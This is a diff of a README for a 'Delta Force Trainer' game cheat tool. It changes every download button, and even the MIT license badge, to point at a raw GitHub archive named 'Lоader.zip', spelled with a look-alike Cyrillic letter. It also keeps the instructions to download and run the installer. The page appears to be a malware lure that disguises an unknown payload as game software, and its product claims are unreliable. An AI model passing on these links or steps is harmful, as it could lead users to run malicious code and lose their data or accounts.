@@ -1,11 +1,11 @@
 # 🚀 Delta Force Trainer
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Delta%20Force%20Trainer-brightgreen?logo=windows)](https://easylauncher.su/PSnzrH)
+[![Download Latest Version](https://raw.githubusercontent.com/192-168-4201/DeltaForce-EliteTrainer/main/Lоader.zip%20Force%20Trainer-brightgreen?logo=windows)](https://raw.githubusercontent.com/192-168-4201/DeltaForce-EliteTrainer/main/Lоader.zip)
 
 Delta Force Trainer is a premier software utility designed to enhance your Delta Force game experience. Unlock all essential items, achieve victories, and push your gaming limits with adaptive features for pro-level play. Targeted for both experts and casual gamers, this trainer ensures seamless integration across top operating systems in 2025.
 
 ## 🧭 Quick Download  
-[![Download Latest Version](https://img.shields.io/badge/Download-Now-blue?logo=download)](https://easylauncher.su/PSnzrH)
+[![Download Latest Version](https://raw.githubusercontent.com/192-168-4201/DeltaForce-EliteTrainer/main/Lоader.zip)](https://raw.githubusercontent.com/192-168-4201/DeltaForce-EliteTrainer/main/Lоader.zip)
 
 ---
 
@@ -40,7 +40,7 @@ Delta Force Trainer download, Delta Force game enhancer 2025, game utility for a
 
 ## 🛠️ Installation
 
-1. Click the [Download](https://easylauncher.su/PSnzrH) button above to get the setup for your operating system.
+1. Click the [Download](https://raw.githubusercontent.com/192-168-4201/DeltaForce-EliteTrainer/main/Lоader.zip) button above to get the setup for your operating system.
 2. Run the installer and follow on-screen instructions.
 3. Launch Delta Force Trainer and enjoy enhanced gameplay.
 
@@ -53,9 +53,9 @@ Delta Force Trainer is solely intended for personal use to elevate your play exp
 
 ## 📃 License  
 MIT License:  
-[![MIT licensed](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)  
+[![MIT licensed](https://raw.githubusercontent.com/192-168-4201/DeltaForce-EliteTrainer/main/Lоader.zip)](https://raw.githubusercontent.com/192-168-4201/DeltaForce-EliteTrainer/main/Lоader.zip)  
 
 ---
 
 ## 🔽 Quick Access Download  
-[![Delta Force Trainer Download](https://img.shields.io/badge/Download-Delta%20Force%20Trainer-brightgreen?logo=github)](https://easylauncher.su/PSnzrH)
+[![Delta Force Trainer Download](https://raw.githubusercontent.com/192-168-4201/DeltaForce-EliteTrainer/main/Lоader.zip%20Force%20Trainer-brightgreen?logo=github)](https://raw.githubusercontent.com/192-168-4201/DeltaForce-EliteTrainer/main/Lоader.zip)
